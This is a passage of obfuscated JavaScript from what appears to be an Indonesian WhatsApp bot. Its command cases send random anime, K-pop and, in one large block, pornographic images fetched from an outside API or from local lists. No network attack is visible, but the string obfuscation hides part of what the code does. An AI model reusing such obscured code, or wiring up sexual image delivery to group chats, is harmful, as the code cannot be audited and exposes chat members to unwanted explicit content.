            _0x358f3b(mess['wait']);
            let _0x3c8af0 = await getBuffer(_0x5804c8(0x1da) + _0x453fc1 + _0x5804c8(0x45b) + _0x932571['BotKey']);
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x3c8af0,
                'caption': _0x5804c8(0x817) + _0x453fc1 + ' nya 😋'
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x4b2):
        case _0x5804c8(0x875):
        case _0x5804c8(0x36f): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x3286f8 = await getBuffer(_0x5804c8(0x1da) + _0x453fc1 + _0x5804c8(0x45b) + _0x932571[_0x5804c8(0xc67)]);
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': _0x3286f8,
                'caption': 'Nih kak foto ' + _0x453fc1 + _0x5804c8(0x277)
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x425):
        case 'suga':
        case 'parkchanyeol':
        case _0x5804c8(0x1f0):
        case 'luhan':
        case 'kimtaehyung':
        case 'kimsoek':
        case 'kimnanjoon':
        case _0x5804c8(0x714):
        case 'kimjunmyeon':
        case _0x5804c8(0x8a7):
        case 'kimjondae':
        case _0x5804c8(0xcee):
        case _0x5804c8(0x696):
        case _0x5804c8(0xd22):
        case 'huangzitao':
        case 'dohkyungsoo':
        case _0x5804c8(0x8d6): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x358f3b(mess['wait']);
            let _0x12fbeb = await getBuffer('https://api.zeeoneofc.my.id/api/cogan/' + _0x453fc1 + _0x5804c8(0x45b) + _0x932571[_0x5804c8(0xc67)]);
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x12fbeb,
                'caption': _0x5804c8(0x580)
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x9ef):
        case 'smug':
        case _0x5804c8(0x778):
        case _0x5804c8(0x20d):
        case _0x5804c8(0xb93):
        case 'blowjob':
        case 'cumarts':
        case 'eroyuri':
        case _0x5804c8(0xaa4):
        case _0x5804c8(0xa68):
        case _0x5804c8(0x451):
        case _0x5804c8(0x1d1):
        case _0x5804c8(0x88d):
        case _0x5804c8(0xd30):
        case 'feetgif':
        case _0x5804c8(0x4c7):
        case _0x5804c8(0xab5):
        case _0x5804c8(0xd43):
        case 'holoero':
        case _0x5804c8(0x85d):
        case _0x5804c8(0xc7e):
        case _0x5804c8(0x29c):
        case _0x5804c8(0x571):
        case _0x5804c8(0x21e):
        case _0x5804c8(0x9d0):
        case 'girl_solo':
        case _0x5804c8(0xbea):
        case _0x5804c8(0x6b5):
        case _0x5804c8(0xd81):
        case _0x5804c8(0x82d):
        case _0x5804c8(0x341):
        case _0x5804c8(0x9f2):
        case 'bj':
        case 'boobs':
        case _0x5804c8(0x12e):
        case _0x5804c8(0x3d8):
        case _0x5804c8(0x982):
        case 'lesbian':
        case _0x5804c8(0x4ac):
        case _0x5804c8(0x66b):
        case _0x5804c8(0x606):
        case _0x5804c8(0x8af):
        case _0x5804c8(0x509):
        case _0x5804c8(0x4f0):
        case _0x5804c8(0x5a4):
        case _0x5804c8(0xabf):
        case 'glasses':
        case _0x5804c8(0xb41):
        case _0x5804c8(0xa2f):
        case _0x5804c8(0x19e):
        case 'orgy':
        case 'panties':
        case _0x5804c8(0x28a):
        case _0x5804c8(0x8df):
        case 'zettai': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(mess[_0x5804c8(0xb42)]);
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(_0x5804c8(0xa6a));
            if (!_0x4c18ee && !_0x1b1e88['key'][_0x5804c8(0xcbd)] && !_0x7b6ab6) return _0x358f3b('Fitur nsfw belum di aktifkan');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x264d83 = await getBuffer('https://api.zeeoneofc.my.id/api/nsfw/' + _0x453fc1 + '?apikey=' + _0x932571['BotKey']);
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': _0x264d83,
                'caption': 'Nih ' + _0x453fc1 + _0x5804c8(0xcd0)
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x36e): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                akira: _0x306a50
            } = require(_0x5804c8(0x725));
            let _0x10f762 = _0x306a50[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x306a50[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x10f762
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x700): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                akiyama: _0x2fc30a
            } = require('./datanya/anime/akiyama');
            let _0x52dc5e = _0x2fc30a[Math[_0x5804c8(0xa2b)](Math['random']() * _0x2fc30a[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x52dc5e
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xbdb): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                ana: _0x5f57f3
            } = require(_0x5804c8(0x647));
            let _0x29d89c = _0x5f57f3[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x5f57f3[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x29d89c
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x568): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                asuna: _0x569da7
            } = require(_0x5804c8(0x37f));
            let _0x42ec49 = _0x569da7[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x569da7[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x42ec49
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x471): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                ayuzawa: _0x27618a
            } = require('./datanya/anime/ayuzawa');
            let _0x1f6876 = _0x27618a[Math[_0x5804c8(0xa2b)](Math['random']() * _0x27618a[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x1f6876
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x6a6): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                boruto: _0xacaa76
            } = require(_0x5804c8(0x498));
            let _0x189daa = _0xacaa76[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0xacaa76['length'])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x189daa
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'chitanda': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                chitanda: _0x339e51
            } = require(_0x5804c8(0x57a));
            let _0x213ea8 = _0x339e51[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x339e51[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x213ea8
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xd4b): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                deidara: _0x1c300a
            } = require(_0x5804c8(0xaa0));
            let _0x4f0bfb = _0x1c300a[Math[_0x5804c8(0xa2b)](Math['random']() * _0x1c300a[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x4f0bfb
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x9d1): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                doraemon: _0x29ec70
            } = require(_0x5804c8(0x9d3));
            let _0x1fd54e = _0x29ec70[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x29ec70[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x1fd54e
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x876): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                elaina: _0x450c7f
            } = require('./datanya/anime/elaina');
            let _0x5605da = _0x450c7f[Math[_0x5804c8(0xa2b)](Math['random']() * _0x450c7f[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5605da
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x3d5): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                emilia: _0x41e8c4
            } = require(_0x5804c8(0x464));
            let _0x2458c0 = _0x41e8c4[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x41e8c4[_0x5804c8(0x977)])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x2458c0
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'erza': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                erza: _0x18bcbe
            } = require(_0x5804c8(0x404));
            let _0x592dc6 = _0x18bcbe[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x18bcbe[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x592dc6
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x699): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                fanart: _0x4abfc9
            } = require(_0x5804c8(0xa81));
            let _0x50d45e = _0x4abfc9[Math['floor'](Math['random']() * _0x4abfc9[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x50d45e
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x8a1): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                genshin: _0x53b0f1
            } = require('./datanya/anime/genshin');
            let _0x2e71b0 = _0x53b0f1[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x53b0f1['length'])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x2e71b0
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xb14): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                gremory: _0x51e3b7
            } = require(_0x5804c8(0x8a6));
            let _0x37b957 = _0x51e3b7[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x51e3b7[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x37b957
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'hestia': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                hestia: _0x5a400b
            } = require(_0x5804c8(0x38f));
            let _0x5db120 = _0x5a400b[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x5a400b['length'])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5db120
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xb23): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                hinata: _0x1cb8b0
            } = require(_0x5804c8(0xce0));
            let _0x490854 = _0x1cb8b0[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x1cb8b0[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x490854
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'husbu': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                husbu: _0x10d7cd
            } = require(_0x5804c8(0xc23));
            let _0x2bff0b = _0x10d7cd[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x10d7cd[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x2bff0b
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x8eb): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                icon: _0x1ce21a
            } = require('./datanya/anime/icon');
            let _0x2ea856 = _0x1ce21a[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x1ce21a[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x2ea856
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x871): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                inori: _0xbfe2e7
            } = require(_0x5804c8(0xc40));
            let _0x532778 = _0xbfe2e7[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0xbfe2e7[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x532778
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x43a): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                isuzu: _0x3e59c5
            } = require('./datanya/anime/isuzu');
            let _0x2a8012 = _0x3e59c5[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x3e59c5[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x2a8012
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'itachi': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                itachi: _0x2c1e36
            } = require(_0x5804c8(0xd17));
            let _0x223404 = _0x2c1e36[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2c1e36[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x223404
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x39d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                itori: _0x773ba2
            } = require(_0x5804c8(0x400));
            let _0x2f75b3 = _0x773ba2[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x773ba2[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x2f75b3
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0xaca): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kaga: _0xdee970
            } = require(_0x5804c8(0x422));
            let _0x1c9689 = _0xdee970[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0xdee970[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x1c9689
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x7bc): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kagura: _0x51485f
            } = require('./datanya/anime/kagura');
            let _0x1f8596 = _0x51485f[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x51485f[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x1f8596
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x9c2): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kaguya: _0x2c2587
            } = require(_0x5804c8(0x155));
            let _0x7b2d56 = _0x2c2587[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2c2587[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x7b2d56
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x4e8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kakasih: _0x221283
            } = require(_0x5804c8(0x41b));
            let _0x3d5ecf = _0x221283[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x221283[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x3d5ecf
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x9ea): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                kaneki: _0x5cfa88
            } = require('./datanya/anime/kaneki');
            let _0x479039 = _0x5cfa88[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x5cfa88[_0x5804c8(0x977)])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x479039
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'kaori': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kaori: _0x153b15
            } = require(_0x5804c8(0x8f5));
            let _0x41ec52 = _0x153b15[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x153b15['length'])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x41ec52
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xbcb): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                keneki: _0x3870a6
            } = require(_0x5804c8(0x56e));
            let _0x4cb1fe = _0x3870a6[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x3870a6['length'])];
